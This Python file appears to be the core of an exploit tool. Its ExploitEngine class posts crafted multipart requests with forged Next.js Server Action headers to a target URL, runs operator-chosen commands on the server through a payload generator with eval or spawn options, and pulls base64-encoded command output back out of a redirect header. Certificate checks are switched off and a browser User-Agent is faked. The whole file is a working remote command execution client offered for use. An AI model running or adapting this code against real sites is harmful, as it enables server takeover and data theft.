import base64
import re
from urllib.parse import unquote
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning

from exploit_tool.payload_generator import PayloadGenerator

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

class ExploitEngine:
    def __init__(self, config):
        self.config = config
        self.session = requests.Session()
        self.command_count = 0
        
    def craft_headers(self, boundary):
        return {
            'Next-Action': 'x',
            'X-Nextjs-Request-Id': PayloadGenerator.generate_hash(8),
            'X-Nextjs-Html-Request-Id': PayloadGenerator.generate_hash(20),
            'Content-Type': f'multipart/form-data; boundary={boundary}',
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0'
        }
    
    def execute(self, command, silent=False, use_eval=False, use_spawn=False):
        self.command_count += 1
        payload_body, boundary = PayloadGenerator.build_exploit_payload(command, use_eval, use_spawn)
        headers = self.craft_headers(boundary)
        
        try:
            response = self.session.post(
                self.config.target_url,
                data=payload_body,
                headers=headers,
                timeout=self.config.timeout,
                allow_redirects=False,
                verify=False
            )
            
            return self.parse_response(response, silent)
            
        except requests.exceptions.Timeout:
            return False, 'timeout', 'Connection timeout'
        except requests.exceptions.SSLError as e:
            return False, 'ssl', str(e)
        except requests.exceptions.RequestException as e:
            return False, 'unknown', str(e)
    
    def parse_response(self, response, silent=False):
        redirect_header = response.headers.get('X-Action-Redirect', '')
        match = re.search(r'/login\?a=([^;]*)', redirect_header)
        
        if match:
            encoded_output = match.group(1)
            url_decoded = unquote(encoded_output)
            try:
                decoded_output = base64.b64decode(url_decoded).decode('utf-8', errors='replace')
            except:
                decoded_output = url_decoded
            return True, 'success', decoded_output
        
        if response.status_code == 403:
            return False, 'forbidden', 'HTTP 403 Forbidden'
        elif response.status_code == 500:
            return False, 'server_error', 'HTTP 500 Internal Server Error'
        else:
            return False, 'unknown', f'HTTP {response.status_code}'

